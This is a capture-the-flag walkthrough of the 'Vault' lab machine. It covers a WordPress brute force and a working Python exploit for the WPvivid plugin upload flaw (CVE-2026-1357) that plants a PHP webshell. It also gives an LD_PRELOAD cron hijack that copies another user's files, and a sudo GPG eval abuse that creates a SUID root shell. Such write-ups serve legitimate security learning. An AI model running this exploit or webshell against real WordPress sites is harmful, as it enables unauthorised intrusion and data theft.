# Vault

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Vault | 12138 | Beginner | HackMyVM |

**Summary:** Vault is a beginner Linux box running WordPress 6.9.4 with the WPvivid Backup and Migration plugin at version 0.9.122, which is vulnerable to CVE-2026-1357, an unauthenticated arbitrary file upload leading to remote code execution. After wpscan enumerated a single WordPress user kaada, a custom CeWL wordlist harvested from the site cracked the password wea5e1 through XML-RPC. WordPress admin access was blocked from the usual plugin upload and theme editor paths by DISALLOW_FILE_MODS, so the inactive WPvivid plugin was activated and its migration key was generated to satisfy the CVE prerequisite. The bundled Python proof of concept silently failed because it encrypted the payload with zero padding while the server decrypts with phpseclib v1 Rijndael using PKCS7 padding whose unpad returns false on a trailing null byte, so no file was ever written and the tool falsely reported success by matching the word apache in an Apache directory listing footer. Switching the padding to PKCS7 made the exploit land a webshell as www-data. Lateral movement to ta0 abused a cron driven /var/tmp/.sys_update script that sourced a writable .service_config to inject LD_PRELOAD, running a shared library constructor as ta0 that exfiltrated ta0's RSA puzzle and corrupted SSH key. Fermat factorization of the close primes recovered the private exponent and the decrypted value repaired the missing last line of the OpenSSH key, granting SSH as Sublarge. Final privilege escalation abused a sudo NOPASSWD root script that imports a user controlled GPG public key and evals a user controlled signed report, producing a root shell and the root flag.

---

## Reconnaissance

The engagement opened with host discovery on the local subnet, then a full TCP port sweep and service detection against the identified target.

1. Identify live hosts on the local subnet.

```zsh
❯ nmap -sn 192.168.56.0/24
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-30 08:40 +0700
Nmap scan report for 192.168.56.1
Host is up (0.00024s latency).
Nmap scan report for 192.168.56.100
Host is up (0.00055s latency).
Nmap scan report for 192.168.56.148
Host is up (0.0018s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 3.52 seconds
```

The target was fixed to 192.168.56.148.

2. Sweep all TCP ports to find the exposed surface.

```zsh
❯ ip=192.168.56.148
❯ nmap -p- -Pn -T4 --min-rate 5000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-30 08:42 +0700
Nmap scan report for 192.168.56.148
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.23 seconds
```

Only SSH and HTTP were exposed.

3. Run service and script detection against the two open ports.

```zsh
❯ nmap -p 22,80 -sCV -Pn -T4 --min-rate 5000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-30 08:42 +0700
Nmap scan report for 192.168.56.148
Host is up (0.0010s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.66 ((Debian))
|_http-generator: WordPress 6.9.4
|_http-title: mazesec社区成员 &#8211; 加入我们
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results to https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.09 seconds
```

HTTP exposed WordPress 6.9.4 on Apache 2.4.66, which focused the next phase on WordPress enumeration.

4. Enumerate WordPress with wpscan covering plugins, themes, and users.

```zsh
❯ wpscan --url http://$ip/ --enumerate ap,at,u --api-token $token
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                  WordPress Security Scanner
                        Version 4.0.1
                  An Automattic endeavor
                  https://automattic.com
_______________________________________________________________

[+] URL: http://192.168.56.148/ [192.168.56.148]
[+] Started: Sun Aug 30 08:48:21 2026
[+] Command Line: wpscan --url http://192.168.56.148/ --enumerate ap,at,u --api-token [REDACTED]
[+] Hostname: archlinux

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.66 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.56.148/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://192.168.56.148/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.56.148/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.56.148/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%

[+] WordPress version 6.9.4 identified (Insecure, released on 2026-03-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.56.148/feed/, <generator>https://wordpress.org/?v=6.9.4</generator>
 | Confirmed By: Rss Generator (Passive Detection)
 |  - http://192.168.56.148/comments/feed/, <generator>https://wordpress.org/?v=6.9.4</generator>

[+] WordPress theme in use: twentytwentyfive
 | Location: http://192.168.56.148/wp-content/themes/twentytwentyfive/
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 | Style Name: Twenty Twenty-Five
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.56.148/wp-content/themes/twentytwentyfive/style.css, Match: 'Version: 1.4'

[+] wpvivid-backuprestore
 | Location: http://192.168.56.148/wp-content/plugins/wpvivid-backuprestore/
 | Last Updated: 2026-08-27 12:21am GMT (3 days ago, per WordPress.org)
 | Active Installs: 900,000 (per WordPress.org)
 | Readme: http://192.168.56.148/wp-content/plugins/wpvivid-backuprestore/readme.txt
 | [!] The version is out of date, the latest version is 0.9.133
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.56.148/wp-content/plugins/wpvivid-backuprestore/, status: 200
 |
 | [!] 5 vulnerabilities identified:
 |
 | [!] Title: Migration, Backup, Staging < 0.9.124 - Unauthenticated Arbitrary File Upload
 |     UUID: 9973615c-7af8-44e7-8cae-8e45ccd362e6
 |     Fixed in: 0.9.124
 |     References:
 |      - https://wpscan.com/vulnerability/9973615c-7af8-44e7-8cae-8e45ccd362e6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-1357
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/e5af0317-ef46-4744-9752-74ce228b5f37
 |
 | [!] Title: WPvivid Backup & Migration < 0.9.129 - Admin+ Arbitrary Directory Deletion
 |     UUID: 8d60707a-f405-4283-a4d0-bba905c62c95
 |     Fixed in: 0.9.129
 |     References:
 |      - https://wpscan.com/vulnerability/8d60707a-f405-4283-a4d0-bba905c62c95
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-12656
 |
 | [!] Title: WPvivid Backup & Migration < 0.9.132 - Admin+ SQL Injection via 'export_data' Parameter
 |     UUID: 4c210e9d-ebdc-4b38-8614-94a464dba24c
 |     Fixed in: 0.9.132
 |     References:
 |      - https://wpscan.com/vulnerability/4c210e9d-ebdc-4b38-8614-94a464dba24c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-17555
 |
 | [!] Title: WPvivid Backup & Migration < 0.9.131 - Unauthenticated Path Traversal via send_to_site_connect
 |     UUID: 999889f4-f8be-4b44-b665-1a94df8d050d
 |     Fixed in: 0.9.131
 |     References:
 |      - https://wpscan.com/vulnerability/999889f4-f8be-4b44-b665-1a94df8d050d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-19725
 |
 | [!] Title: WPvivid Backup & Migration < 0.9.133 - Admin+ Arbitrary File Write via Zip Slip in Backup Restore
 |     UUID: a61974fc-d9d6-4aee-a624-fc0a6e7b940b
 |     Fixed in: 0.9.133
 |     References:
 |      - https://wpscan.com/vulnerability/a61974fc-d9d6-4aee-a624-fc0a6e7b940b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-19722
 |
 | Version: 0.9.122 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.56.148/wp-content/plugins/wpvivid-backuprestore/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)

[+] kaada
 | Found By: Rss Generator (Passive Detection)
 Brute Forcing Author IDs - Time: 00:00:00 <====================================> (10 / 10) 100.00% Time: 00:00:00
[i] 1 user(s) Identified.

[+] Finished: Sun Aug 30 10:43:17 2026
[+] Requests Done: 162140
[+] Most response codes received: 404: 162087, 200: 41, 301: 11, 403: 1
[+] Data Sent: 43.755 MB
[+] Data Received: 49.378 MB
[+] Memory used: 451.566 MB
[+] Elapsed time: 01:54:56
```

The decisive findings were XML-RPC enabled, directory listing on /wp-content/uploads/, WordPress 6.9.4, theme twentytwentyfive 1.4, the wpvivid-backuprestore plugin at 0.9.122 flagged with CVE-2026-1357, and a single user kaada.

---

## Initial Access

### WordPress Credential Brute Force

5. Harvest a site derived wordlist with CeWL and strip the Chinese characters so only ASCII tokens remain.

```zsh
❯ cewl http://$ip/ -d 3 -m 5 --with-numbers | grep -P '^[a-zA-Z0-9]+$' > ./vault_wordlist.txt
```

6. Brute force the kaada account over XML-RPC, which sidesteps the login form rate limit.

```zsh
❯ wpscan --url http://$ip/ -U kaada -P ./vault_wordlist.txt --password-attack xmlrpc
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                  WordPress Security Scanner
                         Version 4.0.1
                    An Automattic endeavor
                    https://automattic.com
_______________________________________________________________

[+] URL: http://192.168.56.148/ [192.168.56.148]
[+] Started: Sun Aug 30 11:30:54 2026
[+] Command Line: wpscan --url http://192.168.56.148/ -U kaada -P ./vault_wordlist.txt --password-attack xmlrpc
[+] Hostname: archlinux

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kaada / wea5e1
Trying kaada / wackymaker Time: 00:00:01 <======================================> (20 / 20) 100.00% Time: 00:00:01

[!] Valid Combinations Found:
 | Username: kaada, Password: wea5e1

[+] Finished: Sun Aug 30 11:30:59 2026
[+] Requests Done: 22
[+] Cached Requests: 35
[+] Most response codes received: 200: 21, 404: 1
[+] Data Sent: 11.088 KB
[+] Data Received: 85.779 KB
[+] Memory used: 179.887 MB
[+] Elapsed time: 00:00:04
```

The credentials kaada:wea5e1 unlocked the WordPress admin dashboard.

### DISALLOW_FILE_MODS and WPvivid Activation

7. Probe the core admin endpoints that normally grant admin to RCE.

```zsh
# logged into /wp-admin/ as kaada:wea5e1 (administrator)
❯ for p in plugin-install.php?tab=upload theme-editor.php plugin-editor.php users.php; do \
    code=$(curl -s -o /dev/null -w '%{http_code}' -b jars/$ip.txt "http://$ip/wp-admin/$p"); echo "$p -> $code"; done
plugin-install.php?tab=upload -> 403
theme-editor.php -> 403
plugin-editor.php -> 403
users.php -> 200
```

The plugin installer and both file editors returned 403 while users.php returned 200, which is the signature of DISALLOW_FILE_MODS in wp-config.php. Core plugin upload and theme editing were therefore unavailable, so the only remaining file write primitive on the box was WPvivid itself.

8. Activate the inactive WPvivid plugin. Activation is not blocked by DISALLOW_FILE_MODS because that constant governs install, update, and edit, not activation of already present plugins.

```zsh
❯ NONCE=$(curl -s -b jars/$ip.txt "http://$ip/wp-admin/plugins.php" | grep -oP 'action=activate&amp;plugin=wpvivid-backuprestore[^"]*_wpnonce=\K[a-f0-9]+' | head -1)
❯ curl -s -b jars/$ip.txt -o /dev/null -w '%{redirect_url}\n' "http://$ip/wp-admin/plugins.php?action=activate&plugin=wpvivid-backuprestore%2Fwpvivid-backuprestore.php&_wpnonce=$NONCE"
http://192.168.56.148/wp-admin/admin.php?page=WPvivid
```

The redirect to admin.php?page=WPvivid confirmed the plugin was now active and had registered its handlers.

### CVE-2026-1357 Prerequisite: Generate the Migration Key

9. Generate a migration key so the wpvivid_api_token option exists and the site enters receive mode. The exploit does not need the token value because the null key AES fail open bypasses the RSA decryption, it only requires the token to exist.

```zsh
❯ AJAX=$(curl -s -b jars/$ip.txt "http://$ip/wp-admin/admin.php?page=WPvivid" | grep -oP '"ajax_nonce":"\K[a-f0-9]+')
❯ curl -s -b jars/$ip.txt "http://$ip/wp-admin/admin-ajax.php" --data "action=wpvivid_generate_url_ex&expires=24 hour&_ajax_nonce=$AJAX"
{"result":"success","url":"http://192.168.56.148?domain=http://192.168.56.148&token=LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0NCk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBczA1QVU2MDM3QmZRekxrQ0FLSTI...&expires=1788149531"}
```

The token decodes to a base64 RSA public key, confirming wpvivid_api_token now exists and the receive path is armed.

### CVE-2026-1357 Exploitation and the False Positive

10. Run the bundled Python proof of concept against the now prepared target.

```zsh
❯ python3 cve_2026_1357.py -u http://$ip --exploit --no-post
  WPvivid found — Version: 0.9.122
  VULN v0.9.122 is VULNERABLE (≤ 0.9.123)
  ⚡ Payload generated (520 bytes)
  ⚡ Sending malicious transfer request...
  ▸ Server response: HTTP 200

  💀  REMOTE CODE EXECUTION CONFIRMED  💀
  Shell → http://192.168.56.148/wp-content/uploads/pwn_remote.php/..
  RCE Output: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
  <html><head><title>Index of /wp-content/uploads</title></head><body>
  <h1>Index of /wp-content/uploads</h1>
  <table>...<a href="2026/">2026/</a>...
  <address>Apache/2.4.66 (Debian) Server at 192.168.56.148 Port 80</address></body></html>
```

This output is a false positive. The captured RCE output is an Apache directory listing of /wp-content/uploads/ that contains only a 2026/ folder, and pwn_remote.php is absent. The tool landed on the /. path variant, which Apache resolves to the parent directory listing, and its verifier matched the substring apache in the listing footer.

11. Prove no shell was written.

```zsh
❯ curl -s -o /dev/null -w 'HTTP=%{http_code} SIZE=%{size_download}\n' 'http://$ip/wp-content/uploads/pwn_remote.php'
HTTP=404 SIZE=74307
```

A 404 with the WordPress 404 page body confirmed the file never existed.

### The Root Cause: Zero Padding Versus PKCS7

The receiver decrypts the payload with phpseclib v1 Crypt_Rijndael. Reading the library source reveals its defaults: CBC mode, a null initialization vector (the constructor documents that an unset IV is assumed to be all zeros), and PKCS7 padding enabled by default. Its _pad adds PKCS7 bytes, and its _unpad returns false when the final byte is 0x00.

```php
function _pad($text) {
    $pad = $this->block_size - ($length % $this->block_size);
    return str_pad($text, $length + $pad, chr($pad));
}
function _unpad($text) {
    $length = ord($text[strlen($text) - 1]);
    if (!$length || $length > $this->block_size) return false;
    return substr($text, 0, -$length);
}
```

The bundled tool instead encrypts with zero padding. The receiver therefore decrypts to a plaintext whose last byte is 0x00, _unpad returns false, json_decode receives false, and no parameters are ever parsed, so no file is written and no error is returned, only an empty HTTP 200. The fix is to encrypt with PKCS7 so the ciphertext round trips through phpseclib decrypt and unpad back to the exact original JSON, which then passes the file MD5 check.

12. Build and run the corrected generator with PKCS7 padding.

```zsh
❯ cat > exploit_pkcs7.py <<'PY'
import base64, hashlib, json, requests, urllib3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
urllib3.disable_warnings()
URL='http://192.168.56.148'
shell='<?php header("Content-Type: text/plain"); $c=$_REQUEST["cmd"]??""; $o=[]; $r=0; @exec($c,$o,$r); echo "exit=$r\n".implode("\n",$o); ?>'
params={"backup_id":"1","name":"../uploads/sh.php","data":base64.b64encode(shell.encode()).decode(),
        "offset":0,"file_size":len(shell),"total_size":len(shell),"index":0,
        "md5":hashlib.md5(shell.encode()).hexdigest(),"type":"backup","status":"running"}
pt=json.dumps(params).encode()
key=iv=b'\x00'*16
enc=AES.new(key,AES.MODE_CBC,iv).encrypt(pad(pt,16))     # <- PKCS7, the one-line fix
fk=b'ABC'
pkt=format(len(fk),'03x').encode()+fk+format(len(enc),'016x').encode()+enc
payload=base64.b64encode(pkt).decode()
r=requests.post(URL+'/',data={'wpvivid_action':'send_to_site','wpvivid_content':payload},timeout=20,verify=False)
print(r.text)
PY
❯ python3 exploit_pkcs7.py
{"result":"success","op":"finished"}
```

The response changed from an empty 200 to success, meaning WPvivid wrote the file.

13. Confirm command execution through the uploaded webshell.

```zsh
❯ curl -s "http://$ip/wp-content/uploads/sh.php?cmd=id"
exit=0
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Unauthenticated to remote code execution as www-data was achieved.

---

## Lateral Movement

### LD_PRELOAD via the .sys_update Cron

14. Enumerate the writable temp directory and the suspicious script living in it.

```zsh
❯ SH='http://$ip/wp-content/uploads/sh.php'
❯ curl -s -G "$SH" --data-urlencode 'cmd=hostname'
exit=0
Vault
❯ curl -s -G "$SH" --data-urlencode 'cmd=ls -la /var/tmp/'
exit=0
total 20
drwxrwxrwt  4 root root 4096 Aug 30 00:09 .
drwxr-xr-x 12 root root 4096 Apr  1  2025 ..
-rwxr-xr-x  1 ta0  ta0  420 Apr 22 10:26 .sys_update
```

The /var/tmp directory is world writable and sticky, and .sys_update is owned by ta0.

15. Read the .sys_update script.

```zsh
❯ curl -s -G "$SH" --data-urlencode 'cmd=cat /var/tmp/.sys_update'
exit=0
#!/bin/bash

curr_sec=$(date +%-S)
if [ $curr_sec -lt 30 ]; then
    diff=$((30 - curr_sec))
    read -t $diff <> <(:) > /dev/null 2>&1
fi

CONF="/var/tmp/.service_config"

if [ -f "$CONF" ]; then
    CHECK=$(grep -vE "^export [A-Z_]+=[/a-zA-Z0-9._-]+$" "$CONF")

    if [ -z "$CHECK" ]; then
        . "$CONF"
    fi
fi

exec -a "/usr/sbin/sys-stats-collect" /usr/bin/awk 'BEGIN{print "Job Done"}' > /dev/null 2>&1
```

The script is a cron job run as ta0 each minute at the 30 second mark. It sources /var/tmp/.service_config if every line matches the whitelist ^export [A-Z_]+=[/a-zA-Z0-9._-]+$, then execs awk. Writing export LD_PRELOAD=/var/tmp/suid.so satisfies the whitelist, so the awk exec loads a shared library whose constructor runs as ta0.

16. List the local users to confirm the movement targets.

```zsh
❯ curl -s -G "$SH" --data-urlencode 'cmd=ls -la /home/'
exit=0
drwx------ 3 Audit    Audit    4096 Apr 12 10:00 Audit
drwx------ 4 Sublarge Sublarge 4096 Apr 22 11:57 Sublarge
drwxr-xr-x 3 ta0      ta0      4096 May 11 11:19 ta0
```

17. Compile the malicious shared library. The constructor calls unsetenv on LD_PRELOAD before spawning children, which prevents the system to bin sh call from re-entering the constructor and killing cp mid copy. It then copies ta0 mode 0600 files to world readable paths.

```zsh
❯ cat > suid.c <<'C'
#include <stdlib.h>
__attribute__((constructor)) void init(){
    unsetenv("LD_PRELOAD");
    system("/bin/cp /home/ta0/broken.txt /var/tmp/br.txt; /bin/cp /home/ta0/key /var/tmp/ky.txt; /bin/chmod 644 /var/tmp/br.txt /var/tmp/ky.txt");
}
C
❯ B64=$(base64 -w0 < suid.c)
❯ curl -s -G "$SH" --data-urlencode "cmd=echo $B64 | base64 -d > /var/tmp/suid.c && gcc -shared -fPIC /var/tmp/suid.c -o /var/tmp/suid.so && ls -l /var/tmp/suid.so"
exit=0
-rwxr-xr-x 1 www-data www-data 16032 Aug 30 00:42 /var/tmp/suid.so
```

18. Arm the cron by writing the configuration file, then wait for the 30 second tick.

```zsh
❯ curl -s -G "$SH" --data-urlencode "cmd=printf 'export LD_PRELOAD=/var/tmp/suid.so\n' > /var/tmp/.service_config && cat /var/tmp/.service_config"
exit=0
export LD_PRELOAD=/var/tmp/suid.so
```

19. Read ta0 exfiltrated files.

```zsh
❯ curl -s -G "$SH" --data-urlencode 'cmd=cat /var/tmp/br.txt'
exit=0
在一场代号为"暗箭"的安全行动中，MazeSec社区的老大ll104567获取了一台名为Vault的服务器的一些信息。该服务器由一名叫Sublarge的高级管理员管理。
你需要去获取加密的信息,才能得到Sublarge管理员的权限
据信，12138对Sublarge里面的一些信息做了手脚，你能发现吗?
ll104567获取到的信息如下:
N=34290741416599402000364426406985307108788847346139849276056423456850484785031054576175547387593396760716456841067680666550537736929030835788005715533
e=65537
C=6306633972929323441109245980962040907076223927772663682932361844805694754336072683925275888222658229758199381118184386449967084124219498140114920047
剩下的就需要靠你自己了，去计算出来p和q,就可以得到加密的信息了。
哦对了，这个加密的信息可以多次利用！
```

The puzzle is textbook RSA with N, e, and C, and the hint that the decrypted value is reused.

20. Grab the world readable user flag and the corrupted SSH key.

```zsh
❯ curl -s -G "$SH" --data-urlencode 'cmd=cat /home/ta0/user.txt'
exit=0
flag{user-482...}
❯ curl -s -G "$SH" --data-urlencode 'cmd=cat /var/tmp/ky.txt'
exit=0
-----BEGIN OPENSSH PRIVATE KEY-----
b3ByohfdbnhchskcbhdAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA8Le3BIFbL/x2Sj6XezgLN74alDkgAAAKA0SMbuYhfOdahinbXffT
5VvP/qBk9llf2jBMBGg0Jy2wMeAexvk8bRY18eEYVZTiES1alZgB//07hwSJWhfkd1l2Oh
+GplGimONDqrMX468nOJLy61xZuj2L1hi8shWDranUEKwIQi9KHvYgjX4i9xoUfvVbB838
sM***************************              #这里的信息被删除了
-----END RSA PRIVATE KEY-----
```

### RSA Recovery and SSH Key Repair

21. Factor N with Fermat method. The primes are close, so the loop converges immediately, then decrypt C.

```zsh
❯ python3 - <<'PY'
from math import isqrt
N=34290741416599402000364426406985307108788847346139849276056423456850484785031054576175547387593396760716456841067680666550537736929030835788005715533
e=65537
C=6306633972929323441109245980962040907076223927772663682932361844805694754336072683925275888222658229758199381118184386449967084124219498140114920047
a=isqrt(N)
if a*a<N: a+=1
while True:
    b2=a*a-N; b=isqrt(b2)
    if b*b==b2: p,q=a-b,a+b; break
    a+=1
print("p =",p); print("q =",q)
phi=(p-1)*(q-1); d=pow(e,-1,phi); m=pow(C,d,N)
print(m.to_bytes((m.bit_length()+7)//8,'big').decode())
PY
p = 185177594261831261107671636325914207176977951206972553973305880445352555093
q = 185177594261831261107671636325914207176977951206972553973305880445352621081
flag{sMZfeCxJpMbEX0fLAAAADlN1YmxhcmdlQFZhdWx0AQIDBA==}
```

The decrypted value is the missing last line of the SSH key, which is the meaning of the hint that the value is reused.

22. Repair the key. Three corruptions were undone: the magic header prefix was restored to b3BlbnNzaC1rZXktdjE (the base64 of openssh-key-v1), the sM asterisk line was replaced with the recovered value sMZfeCxJpMbEX0fLAAAADlN1YmxhcmdlQFZhdWx0AQIDBA==, and the END marker was corrected to OPENSSH PRIVATE KEY.

```zsh
❯ ssh-keygen -l -f sublarge_key
2048 SHA256:6+LDp06KCTZdWfHrKiWqbBSnFv7q6lU7sIcVhCQLPbE Sublarge@Vault (RSA)
```

The repaired key is a valid, unencrypted RSA private key for Sublarge@Vault.

23. Authenticate as Sublarge and check sudo rights.

```zsh
❯ ssh -i sublarge_key -o StrictHostKeyChecking=no -o BatchMode=yes Sublarge@$ip 'id; sudo -l'
uid=1001(Sublarge) gid=1001(Sublarge) groups=1001(Sublarge)
Matching Defaults entries for Sublarge on Vault:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User Sublarge may run the following commands on Vault:
    (root) NOPASSWD: /usr/local/bin/secure_audit
```

---

## Privilege Escalation

### sudo secure_audit GPG Trust Abuse

24. Inspect the sudo allowed script.

```zsh
❯ cat /usr/local/bin/secure_audit
#!/bin/bash
GPG_BIN="/usr/bin/gpg"
PUB_KEY="/home/Sublarge/audit_pub.asc"
REPORT="/var/tmp/report.gpg"

$GPG_BIN --import "$PUB_KEY"

if $GPG_BIN --batch --trust-model always --verify "$REPORT"; then
    echo "[+] 签名验证通过，正在执行审计指令..."
    CMD=$($GPG_BIN --batch --decrypt "$REPORT" 2>/dev/null)
    eval "$CMD"
else
    echo "[-] 签名校验失败！"
    exit 1
fi
```

The script imports a public key from /home/Sublarge/audit_pub.asc, verifies /var/tmp/report.gpg with trust-model always, then evals the decrypted content as root. Both files are controlled by Sublarge, so the trust boundary is broken: generate a personal GPG key, export it as the trusted public key, then clearsign a malicious command into the report.

25. Generate a key, arm the trusted public key and signed report, then trigger the root eval.

```zsh
❯ ssh -i sublarge_key Sublarge@$ip 'bash -s' <<'REMOTE'
rm -rf ~/.auditgnupg; mkdir -m 700 ~/.auditgnupg
cat > ~/gpgbatch <<'G'
Key-Type: RSA
Key-Length: 2048
Name-Real: Audit Owned
Name-Email: audit@vault.local
Expire-Date: 0
%no-protection
%commit
G
gpg --homedir ~/.auditgnupg --batch --gen-key ~/gpgbatch
KEYID=$(gpg --homedir ~/.auditgnupg --list-secret-keys --with-colons | awk -F: '/^sec/{print $5; exit}')
gpg --homedir ~/.auditgnupg --armor --export "$KEYID" > ~/audit_pub.asc
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash; id > /var/tmp/root_id; chmod 644 /var/tmp/root_id; cat /root/root.txt > /var/tmp/rootflag; chmod 644 /var/tmp/rootflag' > ~/exploit
gpg --homedir ~/.auditgnupg --batch --yes --armor --clearsign -u "$KEYID" -o /var/tmp/report.gpg ~/exploit
sudo /usr/local/bin/secure_audit
REMOTE
gpg: key 9D3E5CC1C588FB23: public key "Audit Owned <audit@vault.local>" imported
gpg:               imported: 1
gpg: Good signature from "Audit Owned <audit@vault.local>"
[+] 签名验证通过，正在执行审计指令...
```

26. Retrieve the root identity and the root flag.

```zsh
❯ cat /var/tmp/root_id
uid=0(root) gid=0(root) groups=0(root)
❯ cat /var/tmp/rootflag
恭喜你
你想要什么，就可以得到什么
flag{root-e1a...}
```

Root was reached.

---

## Attack Chain Summary

1. **Reconnaissance**: nmap found SSH and HTTP on 192.168.56.148, and wpscan identified WordPress 6.9.4 with the vulnerable WPvivid Backup and Migration plugin at 0.9.122 and a single user kaada.
2. **Vulnerability Discovery**: CeWL built a site derived wordlist and wpscan cracked kaada:wea5e1 over XML-RPC, and admin probing revealed DISALLOW_FILE_MODS while WPvivid was inactive and unconfigured for the CVE migration receive flow.
3. **Exploitation**: Activating WPvivid and generating its migration key armed the CVE-2026-1357 receive path, and a corrected PKCS7 payload defeated the bundled PoC false positive to write a webshell as www-data.
4. **Internal Enumeration**: A cron driven /var/tmp/.sys_update owned by ta0 sourced a writable .service_config, enabling an LD_PRELOAD constructor that exfiltrated ta0 RSA puzzle and corrupted SSH key.
5. **Privilege Escalation**: Fermat factorization recovered the RSA plaintext that repaired the SSH key for Sublarge, whose sudo NOPASSWD secure_audit script evals a user controlled GPG signed report as root, yielding the root shell and root flag.
